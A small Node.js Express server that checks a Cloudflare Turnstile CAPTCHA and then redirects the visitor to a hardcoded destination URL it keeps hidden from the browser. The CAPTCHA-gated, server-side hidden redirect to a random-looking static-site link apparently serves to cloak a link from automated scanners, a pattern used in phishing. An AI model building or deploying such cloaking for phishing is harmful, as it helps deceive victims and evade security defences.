const express = require('express');
const session = require('express-session');
const path = require('path');
const app = express();

// YOUR SECRET URL - It will never be sent to the browser
const TARGET_URL = process.env.TARGET_URL || 'https://witty-meadow-0f6628a10.5.azurestaticapps.net/l/Y0TEXO';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || 'YOUR_CLOUDFLARE_SECRET_KEY_HERE';

app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'a-very-long-random-secret-string',
    resave: false,
    saveUninitialized: true,
}));

// Serve the HTML file from the 'public' folder
app.use(express.static('public'));

// Endpoint to verify the CAPTCHA
app.post('/verify', async (req, res) => {
    const token = req.body['cf-turnstile-response'];
    
    if (!token) {
        return res.status(400).send('No CAPTCHA token provided.');
    }

    // Verify the token with Cloudflare
    try {
        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `secret=${TURNSTILE_SECRET}&response=${token}`
        });
        
        const data = await response.json();

        if (data.success) {
            // SERVER-SIDE REDIRECT: The URL is never exposed to the browser
            res.redirect(302, TARGET_URL);
        } else {
            res.status(403).send('CAPTCHA verification failed. Please try again.');
        }
    } catch (error) {
        res.status(500).send('Server error during verification.');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
